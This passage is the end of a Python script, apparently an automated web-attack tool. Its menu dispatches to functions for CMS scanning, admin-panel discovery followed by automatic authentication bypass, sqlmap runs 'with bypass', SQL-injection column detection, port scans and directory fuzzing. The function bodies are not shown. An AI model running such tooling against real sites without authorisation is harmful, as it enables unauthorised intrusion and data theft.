            elif choice == "5":
                auto_cms_scan(url)
            elif choice == "6":
                admin_panels = find_admin_panel(url)
                if admin_panels:
                    for admin_url, _ in admin_panels[:3]:
                        if "login" in admin_url.lower() or "Auth Required" in _:
                            auto_auth_bypass(admin_url)
            elif choice == "7":
                web_crawl(url)
            elif choice == "8":
                scan_ports(url)
            elif choice == "9":
                fuzz_directories(url)
            elif choice == "10":
                analyze_headers(url)
            elif choice == "11":
                check_ssl(url)
            elif choice == "12":
                auto_sqlmap_with_bypass(url)
            elif choice == "13":
                auto_nikto_scan(url)
            elif choice == "14":
                max_cols, vuln_params = detect_columns_fixed(url)
                if max_cols:
                    find_vulnerable_columns(url, max_cols, vuln_params)
            else:
                print_error("Invalid option!")
        except KeyboardInterrupt:
            print(f"\n{YELLOW}Scan interrupted by user{NC}")
        except Exception as e:
            print_error(f"Error: {str(e)}")
        print(f"\n{YELLOW}Press Enter to continue...{NC}", end="")
        input()

# ============================================================
# MAIN
# ============================================================

def main():
    try:
        signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(0))
        if len(sys.argv) > 1:
            url = sys.argv[1]
            if not url.startswith("http"):
                url = "http://" + url
            run_auto_scan(url)
        else:
            interactive_menu()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Exiting...{NC}")
        sys.exit(0)
    except Exception as e:
        print_error(f"Fatal error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
